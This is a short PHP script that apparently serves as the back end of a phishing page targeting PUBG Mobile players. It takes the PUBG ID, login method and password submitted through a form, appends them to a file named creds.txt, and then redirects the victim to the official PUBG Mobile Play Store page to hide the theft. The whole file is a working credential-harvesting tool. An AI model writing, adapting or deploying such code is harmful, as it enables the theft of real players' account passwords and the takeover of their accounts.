<?php
$data = "";
if (isset($_POST['pubg_id'])) {
  $data = "PUBG | ID: " . $_POST['pubg_id'] . " | Method: " . $_POST['method'] . " | Pass: " . $_POST['password'];
}
file_put_contents("creds.txt", $data . "\n", FILE_APPEND);
header('Location: https://play.google.com/store/apps/details?id=com.pubg.imobile');
exit();
?>
